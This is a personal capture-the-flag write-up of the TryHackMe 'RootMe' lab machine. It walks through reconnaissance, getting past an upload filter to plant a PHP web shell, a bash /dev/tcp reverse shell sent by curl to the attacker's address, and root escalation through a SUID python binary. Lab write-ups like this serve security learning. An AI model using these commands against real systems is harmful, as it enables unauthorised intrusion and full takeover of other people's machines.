# RootMe (TryHackMe)

**Platform:** TryHackMe
**Difficulty:** 🟢 Easy
**Date:** 2026-09-25
**Tags:** web, file-upload, filter-bypass, reverse-shell, suid, privesc

## Summary

Web box. Found a hidden upload panel, bypassed its extension filter by uploading a .phtml instead of .php, and got command execution as www-data. Turned that into a reverse shell, grabbed the user flag, then escalated to root through a misconfigured SUID python2.7 binary.

## Recon

Target IP: 10.129.132.114

### Nmap

```
nmap -sV <target-ip>
```

Open ports:

```
22/tcp  ssh   OpenSSH
80/tcp  http  Apache 2.4.41 (Ubuntu)
```

SSH parked (no creds). Port 80 is the way in, so web enumeration next.

## Enumeration

### Web (port 80)

Main page had nothing useful, so I went straight to content discovery.

### Directory discovery

```
gobuster dir -u http://10.129.132.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

Found `/panel` which is a file upload form, and `/uploads` which is where uploaded files land (directory listing was open, so I could see and browse them).

## Foothold

The plan was obvious once I saw an upload form on an Apache/PHP server: upload a PHP shell and get it to execute.

Tried uploading a normal `.php` file first, it got rejected. The upload has an extension blacklist. But a blacklist only blocks the exact extensions it knows about, and Apache still executes PHP under other extensions. Renamed the shell to `.phtml` and it went through.

Confirmed code execution by browsing to the uploaded file with a command:

```
http://10.129.132.114/uploads/shell.phtml?cmd=whoami
-> www-data
```

Then upgraded from the web shell to a proper reverse shell.

Listener on my box:
```
nc -lvnp 4444
```

Triggered the reverse shell through the cmd parameter (sent as GET, url-encoded):
```
curl -G "http://10.129.132.114/uploads/shell.phtml" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.129.122.123/4444 0>&1'"
```

Caught the shell as www-data. Grabbed the user flag:
```
cat /var/www/user.txt
```

## Privilege escalation

Ran the SUID hunt (files that run as their owner regardless of who executes them):

```
find / -perm -4000 -type f 2>/dev/null
```

Most of the results were normal (sudo, passwd, mount, su, etc). The one that stood out was:

```
/usr/bin/python2.7
```

A python interpreter should never be SUID. Since it runs as root and python can execute anything, that is a direct path to a root shell. Checked GTFOBins for the python SUID payload:

```
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- `os.setuid(0)` sets the UID to 0 (root), which only works because the binary is SUID-root
- then it spawns bash, now running as root

Confirmed root and read the flag:
```
whoami   -> root
cat /root/root.txt
```

## Flags

- user.txt: /var/www/user.txt
- root.txt: /root/root.txt
- Weird SUID file: /usr/bin/python (python2.7)

## What I tried that did not work

- Uploaded a plain `.php` first, blocked by the filter. `.phtml` bypassed it.
- Sent the reverse shell command as POST first (curl --data-urlencode without -G). The web shell reads `$_GET['cmd']`, so POST data never reached it. Adding `-G` to send it as a GET query fixed it.
- Also hit the raw `&` problem when trying it in the browser url, the `&` in `>&` and `0>&1` cuts the parameter short unless encoded as `%26`. curl with --data-urlencode handled all the encoding, easier than doing it by hand.
- After spawning the SUID python shell, the prompt didn't redraw and looked frozen. It had actually worked, `whoami` returned root. Dumb reverse shells don't always show the new prompt.

## Lessons

- A blacklist on file uploads is weak. If `.php` is blocked, try `.phtml`, `.php5`, `.phar` etc. Apache still runs them as PHP.
- Web shell (`?cmd=`) is fine for quick command execution, but upgrade to a reverse shell for real interactive work.
- Watch GET vs POST. A shell using `$_GET` needs the command in the url query, not POST body.
- SUID + a scriptable binary (python, perl, find, vim, bash) = privesc. Check GTFOBins for the exact command per binary. gtfobins.github.io is the go-to reference.
- `os.setuid(0)` only works because the binary carries root's privileges via the SUID bit.
- Always check which machine the prompt is on. Nearly wasted time running commands on my own attack box instead of the target.
